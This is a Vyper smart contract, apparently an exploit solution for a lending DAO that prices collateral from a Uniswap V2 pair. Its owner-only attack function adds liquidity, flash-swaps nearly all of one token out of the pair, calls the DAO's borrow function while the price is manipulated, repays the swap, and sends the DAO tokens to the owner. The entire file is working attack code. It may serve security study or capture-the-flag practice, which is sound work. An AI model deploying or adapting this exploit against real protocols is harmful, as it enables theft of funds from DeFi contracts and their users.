# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IUniswapV2Pair:
    def token0() -> address: view
    def token1() -> address: view
    def swap(
        amount0Out: uint256,
        amount1Out: uint256,
        to: address,
        data: Bytes[96],
    ): nonpayable

interface IDAO:
    def pair() -> address: view
    def price() -> uint256: view
    def borrow(x: uint256): nonpayable

owner: immutable(address)

dao: IDAO
router: address

@external
@payable
def __init__(_dao: IDAO, _router: address):
    owner = msg.sender
    self.dao = _dao
    self.router = _router

@external
def attack(lp_amount: uint256):
    assert msg.sender == owner, "!owner"
    pair: address = self.dao.pair()
    token_0: address = IUniswapV2Pair(pair).token0()
    token_1: address = IUniswapV2Pair(pair).token1()
    data: Bytes[96] = _abi_encode(pair, token_0, lp_amount)

    IERC20(token_0).approve(self.router, lp_amount)
    IERC20(token_1).approve(self.router, lp_amount)

    raw_call(
        self.router,
        _abi_encode(
           token_0,
           token_1,
           lp_amount,
           lp_amount,
           convert(1, uint256),
           convert(1, uint256),
           self,
           block.timestamp * 2,
            method_id=method_id(
                "addLiquidity(address,address,uint256,uint256,uint256,uint256,address,uint256)"
            ),
        )

    )

    borrow_amount: uint256 = IERC20(token_0).balanceOf(pair) - 1
    IUniswapV2Pair(pair).swap(
        borrow_amount,
        0,
        self,
        data,
    )

@external
def uniswapV2Call(
    _sender: address,
    _amount0: uint256,
    _amount1: uint256,
    _data: Bytes[96]
):
    assert _sender == self, "!sender"
    pair: address = empty(address)
    token_0: address = empty(address)
    lp_amount: uint256 = empty(uint256)
    pair, token_0, lp_amount = _abi_decode(_data, (address,address,uint256))
    assert msg.sender == pair, "!pair"
    assert lp_amount >= self.dao.price(), "!price"
    IERC20(pair).approve(self.dao.address, lp_amount)
    self.dao.borrow(lp_amount)

    fee: uint256 = ((_amount0 * 3) / 997) + 1
    repay: uint256 = _amount0 + fee

    IERC20(token_0).transfer(msg.sender, repay)

    IERC20(self.dao.address).transfer(
        owner,
        IERC20(self.dao.address).balanceOf(self),
    )
